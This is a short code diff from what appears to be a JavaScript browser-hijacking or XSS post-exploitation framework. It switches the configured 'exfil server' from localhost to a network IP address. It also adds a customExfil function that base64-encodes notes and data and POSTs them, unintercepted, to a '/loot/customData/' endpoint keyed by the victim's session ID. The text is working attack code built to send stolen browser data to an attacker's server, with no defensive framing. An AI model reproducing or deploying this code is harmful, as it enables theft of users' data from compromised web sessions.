@@ -51,8 +51,8 @@ function initGlobals()
 	window.taperMode = "trap";
 
 	// Exfil server
-	window.taperexfilServer = "https://127.0.0.1:8444";
-	//window.taperexfilServer = "https://100.115.92.203:8444";
+	//window.taperexfilServer = "https://127.0.0.1:8444";
+	window.taperexfilServer = "https://100.115.92.203:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -193,6 +193,21 @@ function updateTaskCheckJitter(newTop, newBottom)
 	window.taperTaskJitterTop    = newTop;
 }
 
+
+
+function customExfil(note, data)
+{
+	request = new window.taperXHR();
+	request.noIntercept = true;
+	request.open("POST", taperexfilServer + "/loot/customData/" + 
+		sessionStorage.getItem('taperSessionUUID'));
+	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	var jsonObj = new Object();
+	jsonObj["note"] = btoa(note);
+	jsonObj["data"] = btoa(data);
+	var jsonString = JSON.stringify(jsonObj);
+	request.send(jsonString);
+}
 
 
 function canAccessIframe(iframe) {
